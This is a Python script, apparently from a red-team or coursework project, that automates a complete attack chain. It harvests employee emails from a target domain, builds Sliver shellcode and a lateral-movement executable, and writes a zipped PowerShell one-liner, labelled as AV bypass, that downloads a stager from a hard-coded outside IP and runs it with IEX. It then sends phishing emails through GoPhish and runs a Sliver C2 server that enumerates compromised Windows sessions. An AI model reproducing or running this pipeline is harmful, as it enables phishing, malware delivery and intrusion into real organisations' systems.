import os
import subprocess
import csv
import zipfile
import time
import json
import re
import threading
import pexpect
from dotenv import load_dotenv
from tools.gophish.custom_gophish import custom_gophish

def run_shell_script(script_path):
    try:
        # # Run the shell script
        # subprocess.run(["bash", script_path], check=True)
        # Run the shell script silently
        subprocess.run(["bash", script_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Shell script executed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing shell script: {e}")

class reconaissance:
    def __init__(self) -> None:
        self.web_domain = ""
        self.output_file = ""
        self.output_directory = ""

        load_dotenv()
        print(self)
        self.start_spiderfoot()

    def __str__(self) -> str:
        return (
            "RECONAISSANCE PHASE:\n"
            "---------------------------------------\n"
            "Getting some information by:\n"
            "+ Email address\n"
            "- Domain whois\n"
            "- Email gateway\n"
            "- Username\n"
        )
    
    def get_csv_from_emails(self, csv_file_path, emails):
        with open(csv_file_path, 'w', newline='') as csv_file:
            fieldnames = ["First_Name", "Last_Name", "Position", "Email"]
            writer = csv.DictWriter(csv_file, fieldnames=fieldnames)

            # Write header row
            writer.writeheader()

            # Write data rows
            for email in emails:
                print(email)
                writer.writerow({
                    "First_Name": "APT",
                    "Last_Name": "APT",
                    "Position": "APT",
                    "Email": email
                })

    def run_shell_script_with_env(self, script_path):
        # Load environment variables from .env file
        load_dotenv()

        # Collect parameters from environment variables
        temp = os.path.join(".", os.getenv("PATH_EMAILS"))
        domain = os.getenv("WEB_DOMAIN")
        output_file = os.getenv("EMAIL_FILE_TXT")
        csv_file = os.getenv("EMAIL_FILE_CSV")
        output_directory = temp[:-1]
        file_path = os.path.join(output_directory, output_file)

        # if file exist -> delete
        if os.path.exists(file_path): 
            os.remove(file_path)

        print(f"Waiting for scanning email from {domain}")
        try:
            # Run the shell script with the collected parameters
            subprocess.run(["bash", script_path, "-d", domain, "-o", output_file, "-r", output_directory], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # print("Shell script executed successfully.")
            print("+ emails from domain:")

            # Show taken emails
            if (os.path.exists(file_path)):
                unique_emails = set()

                with open(file_path, 'r') as f:
                    for line in f:
                        email = line.strip() # Remove leading/trailing whitespaces and newline characters
                        unique_emails.add(email)

                self.get_csv_from_emails(os.path.join(output_directory, csv_file), unique_emails)

                if os.path.exists(file_path): 
                    os.remove(file_path)
                
            else: print(f"file in path {file_path} not found!")

        except subprocess.CalledProcessError as e:
            print(f"Error executing shell script: {e}")

    def start_spiderfoot(self):
        # Provide the path to your shell script
        script_path = "./tools/spiderfoot/emails_from_domain.sh"

        # Call the function to run the shell script
        self.run_shell_script_with_env(script_path)
        print('\n')

class weaponization:
    def __init__(self) -> None:
        load_dotenv()
        print(self)

        self.temp_shellcode_path = "./data/payloads/win_stager.c"
        self.payload_for_lateral_movement = "./data/payloads/ENTITLED_KILT.exe"
        self.payload_template = "tools/sliver/payload_template.ps1"
        self.public_server_path = os.getenv("WEB_STAGER_PATH")
        self.public_payload_name = os.getenv("PAYLOAD_PS1")
        self.fish = os.getenv("FISH_PS1")
        self.payload_path = os.path.join(self.public_server_path, self.public_payload_name)

        self.shellcode = None
        self.payload = None

        self.create_payload_for_lateral_movement(self.payload_for_lateral_movement)
        data_in_shellcode_file = self.create_shellcode(self.temp_shellcode_path)
        data_in_payload_file = self.load_payload_template(self.payload_template)

        self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
        self.upload_to_website(self.payload_path)
        self.ps_srcipt_for_bypass_av(self.public_server_path, self.fish, self.public_payload_name)
        self.clear_phase()

        print('\n')
    
    def __str__(self) -> str:
        return (
            "WEAPONIZATION PHASE:\n"
            "---------------------------------------\n"
            "Generate payload with Sliver in ps1 format\n"
            "Upload to Apache server\n"
        )
    
    def run_shell_script(self, script_path, file_path):
        try:
            # Change permissions of get_configs.sh to make it executable
            subprocess.run(["chmod", "+x", "./tools/sliver/get_configs.sh"], check=True)

            # Run the shell script
            subprocess.run(["expect", script_path, file_path], check=True)
            # # Run the shell script silently
            # subprocess.run(["bash", script_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            print("Shell script executed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Error executing shell script: {e}")
    
    def create_shellcode(self, file_path = "./data/payloads/win_stager.c"):
        script_path = "./tools/sliver/get_stagers.sh"

        # Check if file_path exists and delete if it does
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"Old shellcode at {file_path} has been deleted.")

        shellcode = None
        # Call the function to run the shell script
        try:
            # Call the function to run the shell script
            self.run_shell_script(script_path, file_path)
            with open(file_path, "r") as file:
                shellcode = file.read()
        except Exception as e:
            print(f"An error occurred: {e}")
        
        return shellcode

    def load_payload_template(self, path = "tools/sliver/payload_template.ps1") -> str:
        try:
            with open(path, "r") as file:
                payload_template = file.read()
            return payload_template
        except FileNotFoundError:
            print(f"Error: File '{path}' not found.")
            return ""
        except Exception as e:
            print(f"An error occurred while loading the payload template: {e}")
            return ""

    def create_payload_for_lateral_movement(self, file_path="./data/payloads/ENTITLED_KILT.exe"):
        script_path = "./tools/sliver/create_payload_for_lateral_movement.sh"

        # Check if file_path exists and delete if it does
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"Old payload at {file_path} has been deleted.")

        # Call the function to run the shell script
        try:
            # Call the function to run the shell script
            self.run_shell_script(script_path, file_path)
            print("prepare payload successfully!")
            return True
        except Exception as e:
            print(f"An error occurred: {e}")

        return False

    def update_shellcode_in_payload(self, shellcode, payload):
        self.shellcode = shellcode

        # Find the start and end positions of the shellcode in the script
        start_marker = "$buf = "
        end_marker = "# Get the target process"
        start_pos = payload.find(start_marker) + len(start_marker)
        end_pos = payload.find(end_marker)

        # Replace the shellcode with the new shellcode
        self.payload = payload[:start_pos] + self.shellcode + payload[end_pos:]

    def upload_to_website(self, file_path):
        # Save self.payload to file_path
        with open(file_path, 'w') as file:
            file.write(self.payload)

    def ps_srcipt_for_bypass_av(self, directory, ps_name, payload_name):
        # Content of the PowerShell script
        ps_content = f"(new-object system.net.webclient).downloadstring('http://18.143.102.216/stagers/{payload_name}') | IEX"

        # Create the PowerShell file
        ps_file_path = os.path.join(directory, ps_name)
        with open(ps_file_path, "w") as ps_file:
            ps_file.write(ps_content)

        # Create a zip file with the PowerShell script
        zip_file_path = os.path.join(directory, f"{ps_name}.zip")
        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
            zipf.write(ps_file_path, arcname=os.path.basename(ps_file_path))

        # Remove the original PowerShell file
        os.remove(ps_file_path)

        return zip_file_path

    def clear_phase(self):
        # check shell code
        # print(self.shellcode)
        # print("---------------------------------------")
        # print(self.payload)

        try:
            # Remove the file specified in self.temp_shellcode_path
            subprocess.run(["rm", "-rf", self.temp_shellcode_path], check=True)

        except subprocess.CalledProcessError as e:
            print(f"Error removing file: {e}")

class delivery:
    def __init__(self) -> None:
        print(self)
        self.start_gophish()
    
    def __str__(self) -> str:
        return (
            "DELIVERY PHASE:\n"
            "---------------------------------------\n"
            "Send emails with containing links to Apache server to emails address just obtained in the reconnaisence stage\n"
        )
    
    def start_gophish(self):
        mygophish = custom_gophish()
        mygophish.campaign_new()

        print('\n')

class exploitation:
    def __init__(self) -> None:
        print(self)

    def __str__(self) -> str:
        return (
            "EXPLOITATION PHASE:\n"
            "---------------------------------------\n"
            "Waiting for target systems running the payload for creating the backdoor ...\n"
        )

class installation:
    def __init__(self) -> None:
        print(self)

    def __str__(self) -> str:
        return (
            "INSTALLATION PHASE:\n"
            "---------------------------------------\n"
            "Waiting for target systems running the payload for creating the backdoor ...\n"
        )
    
class c2:
    def __init__(self) -> None:
        self.ids = []
        self.outstring = None
        self.is_gather = False
        print(self)

        # self.create_configs_for_sliver_cli()
        self.kill_old_process()
        self.start_sliver_server()
        

    def __str__(self) -> str:
        return (
            "COMMAND & CONTROL PHASE:\n"
            "---------------------------------------\n"
        )
    
    def kill_old_process(self):
        script_path = "./tools/sliver/kill_multiplayermod.sh"
        try:
            # Kill old multiplayer mode in previous sliver-server
            subprocess.run(["bash", script_path, "31337"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["bash", script_path, "1234"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("Prepare success!")

        except subprocess.CalledProcessError as e:
            print(f"Error executing shell script: {e}")

    def parse_sessions_output(self, output):
        # Regular expression pattern to match the session table
        pattern = re.compile(r"(ID.*?)\n\n", re.DOTALL)

        # Find all matches of the pattern in the output
        matches = pattern.findall(output)

        # Initialize a list to store session data
        session_data = []

        # Iterate over matches and parse each session table
        for match in matches:
            rows = match.strip().split('\n')
            headers = rows[0].split()
            table = []
            for row in rows[2:]:
                table.append(dict(zip(headers, row.split())))
            session_data.append(table)

        return session_data

    def start_sliver_server(self):
        # Function to read and display output from the subprocess
        def read_output_by_line(self):
            while not self.stop_thread:
                output = self.sliver_server.stdout.readline().strip()
                if output:
                    print(output)
                    if "- windows/amd64" in output:
                        split_list = output.split()
                        session_id = split_list[2]
                        self.ids.append(session_id)
                        self.is_gather = True
                time.sleep(0.1)

        def intro(self):
            # Flag to signal the thread to exit
            self.stop_thread = False

            # Start a thread to read and display output
            output_thread = threading.Thread(target=read_output_by_line, args=(self,))
            output_thread.start()

            # Send commands to sliver-server
            commands = [
                "multiplayer\n",
                "operators\n",
                "profiles\n",
                "stage-listener --url tcp://18.143.102.216:1234 --profile win64\n",
                "mtls -l 8080\n",
                "jobs\n"
            ]

            # Send commands to the sliver-server process
            for command in commands:
                self.sliver_server.stdin.write(command)
                self.sliver_server.stdin.flush()

        def gather_thread_func(self):
            while True:
                if self.is_gather:
                    commands = [
                        f"use {self.ids[-1]}\n",
                        "info\n",
                        "execute -o net view\n",
                        "background\n"
                    ]
                    # Send commands to the sliver-server process
                    for command in commands:
                        self.sliver_server.stdin.write(command)
                        self.sliver_server.stdin.flush()

                    self.is_gather = False
                # Add a short sleep to avoid busy waiting
                time.sleep(0.1)

        try:
            # Start the sliver-server process
            self.sliver_server = subprocess.Popen(['sliver-server'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # gather information from sessions id is comming
            gather_thread = threading.Thread(target=gather_thread_func, args=(self,))
            gather_thread.start()

            # handle
            intro(self)

            gather_thread.join()

        except subprocess.CalledProcessError as e:
            print(f"Error executing sliver-server command: {e}")

def main():
    list_phase = []
    list_phase.append(reconaissance())
    list_phase.append(weaponization())
    list_phase.append(delivery())
    list_phase.append(exploitation())
    list_phase.append(installation())
    list_phase.append(c2())

if __name__ == '__main__':
    main()

    # finish automation for
    print("nice to meet you!")